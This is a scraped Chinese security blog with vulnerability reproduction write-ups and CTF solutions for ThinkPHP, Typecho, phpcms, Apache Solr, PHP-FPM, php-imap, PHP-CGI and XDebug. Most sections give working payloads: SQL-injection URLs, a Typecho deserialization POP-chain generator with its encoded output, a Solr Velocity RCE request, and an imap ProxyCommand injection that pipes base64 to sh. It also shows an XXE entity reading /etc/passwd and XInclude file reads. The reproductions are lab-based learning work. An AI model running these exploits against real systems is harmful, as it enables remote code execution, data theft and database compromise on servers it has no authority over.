一、获取漏洞ThinkPHP3.2.3 官网下载： http://www.thinkphp.cn/donate/download/id/610.html 修改Application/Home/Controller/IndexController.class.php 123456789101112&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller &#123; public function index()&#123; $data &#x3D; array(); $data[&#39;username&#39;] &#x3D; array(&#39;eq&#39;,&#39;admin&#39;); $order &#x3D; I(&#39;get.order&#39;); $m &#x3D; M(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find(); dump($m); &#125;&#125; Application/Home/Conf/config.php 123456789101112&lt;?phpreturn array( &#x2F;&#x2F;&#39;配置项&#39;&#x3D;&gt;&#39;配置值&#39; &#x2F;&#x2F;连接数据库 &#39;DB_TYPE&#39; &#x3D;&gt; &#39;mysql&#39;,&#x2F;&#x2F;数据类型 &#39;DB_HOST&#39; &#x3D;&gt; &#39;localhost&#39;,&#x2F;&#x2F;服务器 &#39;DB_NAME&#39; &#x3D;&gt; &#39;think_login&#39;,&#x2F;&#x2F;数据库名 &#39;DB_USER&#39; &#x3D;&gt; &#39;root&#39;,&#x2F;&#x2F;连接数据库用户名 &#39;DB_PWD&#39; &#x3D;&gt; &#39;root&#39;,&#x2F;&#x2F;密码 &#39;DB_PREFIX&#39; &#x3D;&gt; &#39;think_&#39;,&#x2F;&#x2F;表前缀 &#39;DB_CHARSET&#39; &#x3D;&gt; &#39;utf8&#39;,&#x2F;&#x2F;编码); 二、漏洞实现1http:&#x2F;&#x2F;127.0.0.1&#x2F;thinkphp_3.2.3_full&#x2F;?order[updatexml(1,concat(0x3a,user()),1)]&#x3D; 三、漏洞分析 ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。 ThinkPHP/Library/Think/Db/Driver.class.php 追踪parseKey() 过滤对paylaod没有影响，再追踪I() 也没有过滤。。那么最后调试一下 ================================= 一、获取漏洞TP5.1.22 application/index/controller/Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller &#123; public function index()&#123; $data &#x3D; array(); $data[&#39;username&#39;] &#x3D; array(&#39;eq&#39;,&#39;admin&#39;); $order &#x3D; input(&#39;get.order&#39;); $m &#x3D; db(&#39;user&#39;)-&gt;where($data)-&gt;order($order)-&gt;find(); dump($m); &#125;&#125; 这里需要把php版本切到5.6及以上 控制器的定义语句略有不同，具体参考开发手册，很香 https://www.kancloud.cn/manual/thinkphp5_1/353979 二、漏洞实现1http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5.1.22&#x2F;public&#x2F;index.php&#x2F;Index&#x2F;index?order[username&#96;|updatexml(1,concat(0x3a,user()),1)%23]&#x3D;1 三、漏洞分析thinkphp/library/think/db/Query.php 将传入的field数组直接array_merge()到$this-&gt;options[&#39;order&#39;] 调试一下看看 thinkphp/library/think/db/Builder.php中的parseOrder()函数 跟踪最后的sql语句 1SELECT * FROM &#96;think_user&#96; WHERE &#96;username&#96; IN (:where_AND_username_in_1,:where_AND_username_in_2) ORDER BY &#96;username&#96;|updatexml(1,concat(0x3a,user()),1)#&#96; LIMIT 1 其中:where_AND_username_in_1,:where_AND_username_in_2会通过参数绑定的形式传入 1SELECT * FROM &#96;think_user&#96; WHERE &#96;username&#96; IN (&#39;eq&#39;,&#39;admin&#39;) ORDER BY &#96;username&#96;|updatexml(1,concat(0x3a,user()),1)#&#96; LIMIT 1 注意这里的|操作符 参考链接https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Typecho-反序列化漏洞分析","slug":"Typecho-反序列化漏洞分析","date":"2019-11-18T00:56:15.000Z","updated":"2020-03-28T01:07:03.091Z","comments":true,"path":"2019/11/18/Typecho-反序列化漏洞分析/","link":"","permalink":"https://glotozz.github.io/2019/11/18/Typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 1、获取漏洞 2、漏洞实现 3、漏洞分析 参考链接 逛到一篇Typecho-反序列化漏洞，感觉比较有意思，遂来复现一下 1、获取漏洞 v1.0版本 1git clone https:&#x2F;&#x2F;github.com&#x2F;typecho&#x2F;typecho.git --branch v1.0-14.10.10-release 2、漏洞实现参考漏洞分析最后的漏洞实现 3、漏洞分析漏洞的入口点在install.php 这里只需要传个finish，再把referer改成站内url即可 然后就是反序列化触发点 这里如果构造的反序列化是一个数组，其中adapter设置为某个类，就可以触发相应类的__toString方法 那么继续寻找可用的__toString() var/Typecho/Feed.php $item是一个私有变量数组，去调用screenName变量，这里可以触发__get() __get会在读取不可访问的属性的值的时候调用 那么寻找可用的__get() var/Typecho/Request.php 追踪get()方法 追踪_applyFilter() call_user_func()可命令执行等 总结一下POP链 var/Typecho/Feed.php-&gt;__toString()-&gt;$item[&#39;author&#39;]-&gt;screenName var/Typecho/Request.php-&gt;__get()-&gt;get()-&gt;_applyFilter-&gt;call_user_func() 那么尝试构造payload 但是发现500错误导致没有回显，但是调试明明没问题=。= 在install.php的开始，调用了ob_start() 因为我们上面对象注入的代码触发了原本的exception，导致ob_end_clean()执行，原本的输出会在缓冲区被清理。 我们可以将程序提前exit，不经过后面的报错即可。 这里有两个办法。 1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 这里value被限制了不能为数组，所以考虑设置filter为数组，但是这样比较麻烦，所以参考链接增加如下$item[&#39;category&#39;] = array(new Typecho_Request()); 当然写入文件，反弹shell等无回显的也可 123456789101112131415161718192021222324252627&lt;?php class Typecho_Feed&#123; private $_items &#x3D; array(); const RSS2 &#x3D; &#39;RSS 2.0&#39;; private $_type; public function __construct() &#123; $this-&gt;_type &#x3D; self::RSS2; $item[&#39;author&#39;] &#x3D; new Typecho_Request(); $item[&#39;category&#39;] &#x3D; array(new Typecho_Request()); $this-&gt;_items[0] &#x3D; $item; &#125; &#125; class Typecho_Request&#123; private $_filter &#x3D; array(); private $_params &#x3D; array(); public function __construct() &#123; $this-&gt;_params[&#39;screenName&#39;] &#x3D; &#39;1&#39;; $this-&gt;_filter[0] &#x3D; &#39;phpinfo&#39;; &#125; &#125; $a &#x3D; new Typecho_Feed(); $b &#x3D; [&#39;adapter&#39;&#x3D;&gt;$a]; echo urlencode(base64_encode(serialize($b))); 1YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjc6InBocGluZm8iO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOiIxIjt9fX19fXM6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7fX0%3D 参考链接 https://www.cnblogs.com/litlife/p/11273647.html https://paper.seebug.org/424/","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"复现几个漏洞","slug":"复现几个近期漏洞","date":"2019-11-16T04:36:45.000Z","updated":"2020-04-10T03:26:49.560Z","comments":true,"path":"2019/11/16/复现几个近期漏洞/","link":"","permalink":"https://glotozz.github.io/2019/11/16/%E5%A4%8D%E7%8E%B0%E5%87%A0%E4%B8%AA%E8%BF%91%E6%9C%9F%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 1、php 远程代码执行漏洞(CVE-2019-11043) 漏洞详情 搭建环境 2、Apache solr模板注入漏洞 3、PHP imap 远程命令执行漏洞（CVE-2018-19518） 搭建环境 漏洞复现 4、PHP-CGI远程代码执行漏洞（CVE-2012-1823） 搭建环境 漏洞复现 5、PHP文件包含漏洞（利用phpinfo） 利用原理 搭建环境 漏洞复现 6、XDebug 远程调试漏洞（代码执行） 搭建环境 漏洞复现 参考链接： 1、php 远程代码执行漏洞(CVE-2019-11043) 链接： https://bugs.php.net/bug.php?id=78599 env_path_info underflow in fpm_main.c can lead to RCE 漏洞详情 当Nginx使用特定的fastcgi配置时，存在远程代码执行漏洞，但这个配置并非Nginx默认配置。当fastcgi_split_path_info字段被配置为 ^(.+?\\.php)(/.*)$;时，攻击者可以通过精心构造的payload，造成远程代码执行漏洞，该配置已被广泛使用，危害较大 当Nginx + php-fpm的服务器有如下配置的时候，都会出现RCE 1234567location ~ [^&#x2F;]\\.php(&#x2F;|$) &#123; ... fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ...&#125; 搭建环境 环境： https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043 之前一直是用docker，这里需要用docker-compose 123#安装curl -L https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.22.0&#x2F;docker-compose-&#96;uname -s&#96;-&#96;uname -m&#96; &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-composechmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose 拉取并搭建 1[root@glotozz CVE-2019-11043]# docker-compose up -d 能访问http://ip:8080/index.php即可 工具： https://github.com/neex/phuip-fpizdam 需要安装go语言 123wget https:&#x2F;&#x2F;dl.google.com&#x2F;go&#x2F;go1.12.linux-amd64.tar.gzsudo tar -zxvf go1.12.linux-amd64.tar.gz -C &#x2F;usr&#x2F;localexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin 进入POC目录 12go buildgo run . &quot;http:&#x2F;&#x2F;59.110.164.44:8080&#x2F;index.php&quot; 注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。 2、Apache solr模板注入漏洞 2019年10月31日，国外安全研究员s00py在Github公开了一个Apache Solr Velocity模板注入远程命令执行的poc。 经过研究，发现该0day漏洞真实有效并且可以攻击最新版本(8.2.0)的Solr。 环境： https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip 搭建 需要创建一个core， 先手动在/server/solr/目录下创建一个test的文件夹，然后将/server/solr/configsets/_default/下的conf目录拷贝到test目录下 ， 再在页面创建 访问http://127.0.0.1:8983/solr/test/config Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。 12345678910&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; 再次观察已被置为true 实现RCE 1select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 前两个是Seebug漏洞库看到的比较新的漏洞，后面的是复现第一个漏洞时发现了vulhub，放在一起还有几个早一点的漏洞，顺便学习复现下 3、PHP imap 远程命令执行漏洞（CVE-2018-19518） php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。 因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。 搭建环境 环境： https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518 1docker-compose up -d 漏洞复现1hostname&#x3D;x -oProxyCommand&#x3D;echo ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo&#x3D;|base64 -d|sh&#125;&amp;username&#x3D;111&amp;password&#x3D;222 其中中间那段base64解码为echo &#39;1234567890&#39;&gt;/tmp/test0001 1docker-compose exec web bash 4、PHP-CGI远程代码执行漏洞（CVE-2012-1823）影响版本 php &lt; 5.3.12 or php &lt; 5.4.2 访问http://your-ip:8080/index.php?-s即爆出源码，说明漏洞存在。 那么，可控命令行参数，能做些什么事。 通过阅读源码，我发现cgi模式下有如下一些参数可用： -c 指定php.ini文件的位置 -n 不要加载php.ini文件 -d 指定配置项 -b 启动fastcgi进程 -s 显示文件源码 -T 执行指定次该文件 -h和-? 显示帮助 最简单的利用方式，当然就是-s，可以直接显示源码： 突然想起之前有些题目是通过这个来读取源码的，漏洞原理具体参考链接，还是比较好理解的 这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。 搭建环境 环境： https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823 1docker-compose up -d 漏洞复现1http:&#x2F;&#x2F;59.110.164.44:8080&#x2F;?-s 1234&#x2F;index.php?-d allow_url_include&#x3D;on -d auto_prepend_file&#x3D;php:&#x2F;&#x2F;inputPOST:&lt;?php echo shell_exec(&quot;id&quot;); ?&gt; 5、PHP文件包含漏洞（利用phpinfo） PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 利用原理 在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。 同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。 在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。 但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。 这个时候就需要用到条件竞争，具体流程如下： 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell 搭建环境 环境： https://github.com/vulhub/vulhub/tree/master/php/inclusion 1docker-compose up -d 漏洞复现 利用脚本exp.py实现了上述过程，成功包含临时文件后，会执行&#39;)?&gt;，写入一个新的文件/tmp/g，这个文件就会永久留在目标机器上。 用python2执行：python exp.py your-ip 8080 100： 失败了。。 6、XDebug 远程调试漏洞（代码执行） XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1： 12xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1 这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。 搭建环境 环境： https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce 1docker-compose up -d 漏洞复现 参考链接：http://www.thinkphp.cn/topic/66216.html https://www.cnblogs.com/yuzly/p/11782608.html https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template https://github.com/vulhub/vulhub","categories":[],"tags":[]},{"title":"湖湘杯+红帽杯+百越杯wp","slug":"湖湘杯-红帽杯-百越杯wp","date":"2019-11-09T11:16:24.000Z","updated":"2020-03-31T00:34:46.718Z","comments":true,"path":"2019/11/09/湖湘杯-红帽杯-百越杯wp/","link":"","permalink":"https://glotozz.github.io/2019/11/09/%E6%B9%96%E6%B9%98%E6%9D%AF-%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E7%99%BE%E8%B6%8A%E6%9D%AFwp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 湖湘杯 web1 web2 创新方向4 创新方向5 红帽杯 web1 bank_service web2 ticket_system 百越杯 第一题 第二题 参考链接 湖湘杯web1参考链接1，应该是非预期解，复现即可 唯一的区别是传入的url需要前缀http，可以加个重定向 123&lt;?php header(&quot;Location:listen:&#x2F;&#x2F;listen.xyz&quot;);?&gt; web2tp5的历史RCE漏洞，之前复现过，一把梭 创新方向4参考链接2，复现即可 创新方向5 参考链接3，前半部分，主要就是＄非$ 构造 1?keyone&#x3D;00000000000000000000000000000000000000000000000000000000000000000000006666672%EF%BC%84 然后是 123if(strstr($_SERVER[&#39;REQUEST_URI&#39;],&#39;You_Are_Cool&#39;))&#123; exit();&#125; 只需要利用url编码绕过即可 然后是 12if(mime_content_type($f) &#x3D;&#x3D; &#39;application&#x2F;vnd.font-fontforge-sfd&#39;)&#123;&#125; 一开始想着改Content-Type，发现修改对结果没有影响，修改内容头部发现有用，搜索一波发现如下即可绕过 1SplineFontDB: 3.0 最后一步卡住了， 12345if(!strstr($filename,&quot;.&quot;))&#123; echo &quot;ok33&quot;; echo $filename; file_put_contents(&#39;&#x2F;tmp&#x2F;&#39;.$filename,$secert);&#125; 无法绕过.就无法遍历目录，也没找到目录遍历、文件包含等漏洞 session存在于tmp目录下，但是即使覆盖也缺少后续利用的地方 红帽杯web1 bank_servicenodejs搭建的聊天室，猜测是原型链污染。好吧不是 参考： https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/#bank-service 考点是solr RCE ，没有环境鸽了 web2 ticket_systemXXE读源码 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;ticket&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;code&gt;123123&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt; 12&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;app&#x2F;controller&#x2F;Index.php&quot;&gt;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;app&#x2F;controller&#x2F;Ticket.php&quot;&gt; /etc/passwd 1234567891011121314151617181920root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falsemysql:x:101:101:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false Index.php 123456789101112131415161718&lt;?php&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | ThinkPHP [ WE CAN DO IT JUST THINK ]&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | Copyright (c) 2006-2018 http:&#x2F;&#x2F;thinkphp.cn All rights reserved.&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | Licensed ( http:&#x2F;&#x2F;www.apache.org&#x2F;licenses&#x2F;LICENSE-2.0 )&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; | Author: liu21st &lt;liu21st@gmail.com&gt;&#x2F;&#x2F; +----------------------------------------------------------------------&#x2F;&#x2F; [ åºç¨å¥å£æä»¶ ]namespace think;require __DIR__ . &#39;&#x2F;..&#x2F;vendor&#x2F;autoload.php&#39;;&#x2F;&#x2F; æ§è¡HTTPåºç¨å¹¶ååº(new App())-&gt;http-&gt;run()-&gt;send(); 1234567891011121314151617181920212223242526&lt;?phpnamespace app\\controller;use think\\facade\\Session;class Index extends Base&#123; public $view; public function __construct() &#123; parent::__construct(False); &#125; public function index() &#123; return $this-&gt;view-&gt;fetch(&quot;index&quot;); &#125; public function login() &#123; $username &#x3D; $this-&gt;request-&gt;post(&quot;username&quot;); $password &#x3D; $this-&gt;request-&gt;post(&quot;password&quot;); Session::clear(); Session::set(&quot;username&quot;,$username); Session::set(&quot;password&quot;,$password); &#125;&#125; 提示需要RCE，很容易联想到tp5的RCE,配合phar反序列化，这里反序列化的入口点是 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;phar:&#x2F;&#x2F;&#x2F;tmp&#x2F;xxx&quot;&gt;]&gt;&lt;ticket&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;code&gt;123123&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt; 然后参考之前写的文章即可 百越杯第一题 一道二次注入，注册处利用查询的用户名截取一定长度来可以进行引号逃逸。 测试发现30位的时候成功逃逸为admin[24个空格]\\ 二次查询的时候变成如下 1234select * from users where username&#x3D;&#39;admin \\&#39; and msgid&#x3D;&#39;1&#39;;#攻击语句select * from users where username&#x3D;&#39;admin \\&#39; and msgid&#x3D;&#39; or 1#&#39;; 那么后面就可以盲注了 第二步， 导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入 123content&#x3D;&lt;root xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt; &lt;xi:include href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;flag&quot; parse&#x3D;&quot;text&quot;&#x2F;&gt;&lt;&#x2F;root&gt; 第二题原题小改 将Read类中的$var变量修改为私有属性，可以轻松绕过 好像把flag位置也换了，我本地测就不管了😀 反序列化，首先寻找魔术方法触发点 Show类的__construct()可以作为入口，echo时 调用__toString()，需要把$this-&gt;source设置为Show类 当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。 那么观察到Test类中存在return $func()，需要调用__get()，即调用不存在的变量 也就是说只需要把str[&#39;str&#39;]设置为Test类即可，会调用不存在的source 再把Test类的$params设置为Read类即可触发__invoke() 构造payload 1234567891011121314151617181920212223242526&lt;?phperror_reporting(3);class Read &#123; private $var &#x3D; &#39;fllllllaaaaaag&#39;;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $params;&#125;$c &#x3D; new Read();$b &#x3D; new Test();$b-&gt;params &#x3D; $c;$d &#x3D; new Show();$d-&gt;str &#x3D; array(&#39;str&#39;&#x3D;&gt;$b);$a &#x3D; new Show();$a-&gt;source &#x3D; $d;echo urlencode(serialize($a)); 参考链接https://1isten.xyz/2018/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9ssrf%E7%9A%84%E7%90%86%E8%A7%A3/ https://ray-cp.github.io/archivers/CVE-2017-17562-GoAhead-rce?tdsourcetag=s_pctim_aiomsg https://cloud.tencent.com/developer/article/1366247?client=tim&amp;ADUIN=243536998&amp;ADSESSION=1573306397&amp;ADTAG=CLIENT.QQ.5603_.0&amp;ADPUBNO=26933 https://www.cnblogs.com/20175211lyz/p/11560311.html","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"phpcms_v9.6.0SQL注入漏洞分析","slug":"phpcms-v9-6-0SQL注入漏洞分析","date":"2019-11-07T23:30:10.000Z","updated":"2020-04-02T04:13:22.062Z","comments":true,"path":"2019/11/08/phpcms-v9-6-0SQL注入漏洞分析/","link":"","permalink":"https://glotozz.github.io/2019/11/08/phpcms-v9-6-0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、获取漏洞 二、漏洞实现 三、漏洞分析 四、修复方案 参考链接 一、获取漏洞phpcms_v9.6.0_UTF8 下载链接：http://download.phpcms.cn/v9/9.6/ 二、漏洞实现参考漏洞分析最后一步，偷懒 三、漏洞分析起点在phpcms/modules/content/down.php中， 我们可控$a_k，跟踪sys_auth()这个解码函数 考虑伪造，追踪parse_str(), 内置函数parse_str()会自动进行urldecode()以及存在变量覆盖漏洞 继续往下看，存在sql查询语句,也就是我们可以搞事情的地方 那么考虑如何伪造，与之前dedecms漏洞复现-2中的前台任意用户登录有些相似之处 判断cookie中的DeDeUserID_ckMd5与md5($cfg_cookie_encode.$_COOKIE[$key])的前16位比较是否相等，只要过了这个判断就没啥问题了。我们可以利用任意用户的一组来绕过 当时是寻找PutCookie()，所以这里我们直接全局搜索sys_auth(，寻找调用sys_auth()方法中的&#39;ENCODE&#39;，且第一个变量我们要可控 phpcms/libs/classes/param.class.php（这些利用点的寻找需要耐心） 全局搜索调用这个set_cookie()类方法的地方，有很多，随便选一个 phpcms/modules/member/index.php 经过一次safe_replace()，可以看一下，但是因为我们可以二次urlencode()编码，目测问题不大 这里的单引号过滤我们可以利用最后一个替换为空来绕过 1%2\\7 构造payload，调试下，发现在下面断了 这里的$nickname存在正则匹配，打扰了，继续寻找调用set_cookie() phpcms/modules/attachment/attachments.php 将$arr转化成json数组，考虑$src，追踪调用这个方法的地方 这里$filepath似乎不可控。。。 继续追踪，同个文件中 舒服了。。搜索调用这个方法的地方，没有搜索到调用这个方法的，js中存在ajax告诉我们直接调用即可 所以以后还是先把每个函数先看看一看再说，如果我之前看到了这个肯定就先对这个进行探索 1$.get(&#39;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;&#39;+id+&#39;&amp;src&#x3D;&#39;+src+&#39;&amp;filename&#x3D;&#39;+filename); 那么直接构造payload（需要用户登录状态） 